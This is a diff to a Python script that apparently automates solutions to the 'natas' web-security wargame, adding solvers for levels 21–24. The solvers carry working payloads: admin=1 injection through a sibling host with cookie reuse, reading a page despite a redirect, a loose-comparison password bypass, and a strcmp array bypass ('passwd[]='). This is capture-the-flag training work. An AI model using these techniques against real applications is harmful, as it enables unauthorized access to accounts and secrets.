@@ -7,10 +7,14 @@ login = "natas"
 passwords = ["natas0"]
 level = -1
 
-def req(method, url, headers={}, body=""):
+def req(method, url, headers={}, body="", subhost=None):
+    chost = "{}{}.{}".format(login, level, host)
+    if subhost != None:
+        chost = "{}.{}".format(subhost, host)
+
     auth = base64.b64encode("{}{}:{}".format(login, level, passwords[level]).encode()).decode()
     headers["Authorization"] = "Basic {}".format(auth)
-    conn = http.client.HTTPConnection("{}{}.{}".format(login, level, host))
+    conn = http.client.HTTPConnection(chost)
     conn.request(
         method,
         url,
@@ -20,12 +24,12 @@ def req(method, url, headers={}, body=""):
     
     return(conn.getresponse())
 
-def rex(method, url, regexp, headers={}, body="", log=True):
+def rex(method, url, regexp, headers={}, body="", subhost=None, log=True):
     if log: print(" Request to web server: ", end="")
-    res = req(method, url, headers, body)
+    res = req(method, url, headers, body, subhost)
     reg = None
     data = res.read().decode(errors="ignore")
-    if res.status == 200:
+    if res.status == 200 or res.status == 302:
         if log: print("OK")
         reg = re.search(regexp, data)
     else:
@@ -476,7 +480,85 @@ def level20():
         print(" Password found: {}".format(passwords[level + 1]))
     else:
         print(" Password not found")
-        
+
+def level21():
+    h = "{}{}-experimenter".format(login, level)
+    print(" Send form to experimenter host {}".format(h))
+    res, reg = rex(
+        "POST",
+        "/index.php",
+        "",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        body="submit=Update&admin=1",
+        subhost=h,
+    )
+
+    if res.status != 200: return
+    c = res.getheader("Set-Cookie")
+    print(" Get page with cookie {}".format(c))
+    res, reg = rex(
+        "GET",
+        "/",
+        "Password: (\w+)</pre>",
+        headers={"Cookie": c},
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level22():
+    u = "/?revelio=1"
+    print(" Get page ignoring with Location header {}".format(u))
+    res, reg = rex(
+        "GET",
+        u,
+        "Password: (\w+)</pre>",
+    )
+
+    if res.status != 302: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level23():
+    p = "11iloveyou"
+    print(" Get page with password {}".format(p))
+    res, reg = rex(
+        "GET",
+        "/?passwd={}".format(p),
+        "Password: (\w+)</pre>",
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level24():
+    u = "/?passwd[]="
+    print(" Send parameter as array {}".format(u))
+    res, reg = rex(
+        "GET",
+        u,
+        "Password: (\w+)</pre>",
+        log=False,
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -487,8 +569,8 @@ levels = [
     level8, level9, level9, level11,
     level12, level12, level14, level15,
     level16, level17, level18, level18,
-    level20, levelN, levelN, levelN,
-    levelN, levelN, levelN, levelN,
+    level20, level21, level22, level23,
+    level24, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN,
 ]
